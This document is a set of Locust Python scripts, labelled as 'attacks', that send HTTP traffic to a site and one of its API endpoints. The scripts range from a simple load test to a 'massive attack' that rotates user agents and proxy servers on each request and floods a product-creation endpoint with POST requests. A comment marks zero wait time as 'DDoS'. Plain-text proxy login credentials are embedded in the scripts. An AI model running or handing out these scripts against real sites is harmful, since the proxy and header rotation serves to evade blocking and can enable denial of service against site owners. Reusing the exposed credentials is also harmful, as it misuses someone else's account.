
Simple Attack 
pip install locust

locustfile.py

https://test.jukti.ai


```python
from locust import HttpUser, task, between  
  
class MyLoadTest(HttpUser):  
    wait_time = between(1, 3)  
    # Human-like traffic wait_time = between(2, 5)
    # High load wait_time = between(0.1, 0.3)
    # DDoS wait_time = between(0, 0)
  
    @task  
    def home(self):  
        self.client.get("/")
```

Attack  With User-Agent Rotated Per Request

```python
from locust import HttpUser, task, between
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile"
]

class UserAgentTest(HttpUser):
    wait_time = between(1, 3)

    @task
    def home_page(self):
        ua = random.choice(USER_AGENTS)
        self.client.get(
            "/",
            headers={"User-Agent": ua}
        )

```

Attack With Rotating Proxy Per Request
```python 
from locust import HttpUser, task, between
import random

PROXIES = [
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10001",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10002",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10003",
]

class ProxyTest(HttpUser):
    wait_time = between(1, 2)

    @task
    def load_with_proxy(self):
        proxy = random.choice(PROXIES)
		
        self.client.get(
            "/",
            proxies={
                "http": proxy,
                "https": proxy,
            }
        )

```


Massive Attack With Rotating Proxy & User Agent Per Request

```python 
from locust import HttpUser, task, between
import random


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile"
]


PROXIES = [
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10001",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10001",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10001",
]

class LoadTest(HttpUser):
    wait_time = between(1, 2)

    @task
    def index(self):
        ua = random.choice(USER_AGENTS)
        proxy = random.choice(PROXIES)

        self.client.get(
            "/",
            headers={"User-Agent": ua},
            proxies={
                "http": proxy,
                "https": proxy
            }
        )
```


Attack to API End Point With Payload

```python
from locust import HttpUser, task, between
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile"
]

PROXIES = [
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10001",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10002",
    "http://sp8tcdlo12:a3+yfO2WjCesfh5O7l@gate.decodo.com:10003",
]

class APITest(HttpUser):
    wait_time = between(1, 2)

    @task
    def create_product(self):

        # Rotate UA + Proxy
        ua = random.choice(USER_AGENTS)
        proxy = random.choice(PROXIES)

        payload = {
            "ProductName": "Learn With Rabbil",
            "ProductCode": "LWR1",
            "Img": "https://rabbil.com/files/rabbilVai1.webp?v=2",
            "UnitPrice": "500",
            "Qty": "2",
            "TotalPrice": "1000"
        }

        self.client.post(
            "/api/v1/CreateProduct",
            json=payload,
            headers={
                "User-Agent": ua,
                "Content-Type": "application/json"
            },
            proxies={
                "http": proxy,
                "https": proxy
            },
            timeout=30
        )

```

